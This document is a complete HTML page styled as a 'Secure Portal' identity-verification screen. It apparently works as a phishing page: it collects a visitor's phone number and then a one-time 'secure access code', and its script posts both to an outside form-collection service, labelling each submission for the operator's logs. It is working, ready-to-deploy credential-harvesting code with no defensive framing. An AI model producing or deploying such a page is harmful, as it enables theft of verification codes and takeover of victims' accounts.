<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification - Secure Portal</title>
  <style>
    body { 
      margin: 0; 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
      background-size: cover !important; 
      color: white; 
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .overlay { 
      background: rgba(0,0,0,0.7); 
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container { 
      background: rgba(25, 25, 25, 0.95); 
      padding: 40px 30px; 
      width: 340px; 
      border-radius: 12px; 
      border: 1px solid rgba(255,255,255,0.1);
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      text-align: center;
      z-index: 10;
    }
    .logo { width: 220px; margin-bottom: 25px; }
    h2 { margin: 0 0 10px 0; font-size: 22px; }
    p { font-size: 13px; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
    
    input { 
      display: block; 
      margin: 15px auto; 
      padding: 14px; 
      width: 100%; 
      box-sizing: border-box;
      border-radius: 6px; 
      border: 1px solid #444; 
      background: #fff;
      color: #000;
      font-size: 16px;
    }
    input:focus { border-color: #007bff; outline: none; }

    button { 
      padding: 14px; 
      border-radius: 6px; 
      border: none; 
      cursor: pointer; 
      background: #f0f0f0; 
      color: #000;
      font-weight: bold; 
      width: 100%; 
      margin-top: 10px; 
      transition: background 0.3s;
    }
    button:hover { background: #ddd; }
    button:disabled { background: #555 !important; color: #888; cursor: not-allowed; }
    
    .btn-verify { background: #4caf50; color: white; margin-top: 20px; }
    .btn-verify:hover { background: #45a049; }

    .status-msg { 
      margin-top: 15px; 
      font-size: 13px; 
      color: #ffd700; 
      display: none; 
      padding: 10px;
      border-radius: 4px;
      background: rgba(255, 215, 0, 0.1);
    }
    hr { margin: 30px 0; border: 0; border-top: 1px solid #333; }
  </style>
</head>
<body>

<div class="overlay">
  <div class="container">
    <img src="logo.png" class="logo" alt="Logo">

    <h2>Identity Verification</h2>
    <p>Please enter your phone number to receive your secure access code.</p>

    <!-- Unified Form -->
    <form id="vForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
      
      <!-- Captured data -->
      <input type="text" name="phone_number" id="phone" placeholder="Phone Number (e.g. +1...)" required>
      
      <!-- Hidden tag to track button used -->
      <input type="hidden" name="user_action" id="userAction" value="">

      <button type="submit" id="reqBtn">Request Code</button>
      <div id="waitMsg" class="status-msg">
        ✔ Request sent. Please stay on this page.
      </div>

      <hr>

      <p>Already have a code? Enter it above then click verify.</p>
      <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
      <div id="successMsg" class="status-msg" style="color: #4caf50; background: rgba(76, 175, 80, 0.1);">
        ✔ Verifying code... Please wait.
      </div>
    </form>
  </div>
</div>

<script>
  const vForm = document.getElementById('vForm');
  const reqBtn = document.getElementById('reqBtn');
  const subBtn = document.getElementById('subBtn');
  const userAction = document.getElementById('userAction');

  vForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Identify which button was clicked
    const clickedBtn = document.activeElement;
    const isRequest = clickedBtn.id === 'reqBtn';
    
    // Set hidden value for your logs
    userAction.value = isRequest ? "CODE_REQUEST" : "VERIFICATION_SUBMISSION";

    const statusId = isRequest ? 'waitMsg' : 'successMsg';
    const statusEl = document.getElementById(statusId);

    // Disable buttons
    reqBtn.disabled = true;
    subBtn.disabled = true;
    const originalText = clickedBtn.innerText;
    clickedBtn.innerText = "Sending...";

    try {
      // Standard form submission to avoid 400 Bad Request
      const response = await fetch(vForm.action, {
        method: 'POST',
        body: new FormData(vForm),
        headers: { 'Accept': 'application/json' }
      });

      if (response.ok) {
        clickedBtn.innerText = "Success";
        statusEl.style.display = "block";
        
        // Allow retry after 5 seconds
        setTimeout(() => {
          reqBtn.disabled = false;
          subBtn.disabled = false;
          clickedBtn.innerText = originalText;
        }, 5000);
      } else {
        alert("Server Error (" + response.status + "): Please try again or check your form settings.");
        resetButtons(clickedBtn, originalText);
      }
    } catch (error) {
      alert("Connection Blocked: Please disable Ad-Blockers or use a local server.");
      resetButtons(clickedBtn, originalText);
    }
  });

  function resetButtons(btn, text) {
    reqBtn.disabled = false;
    subBtn.disabled = false;
    btn.innerText = text;
  }
</script>

</body>
</html>
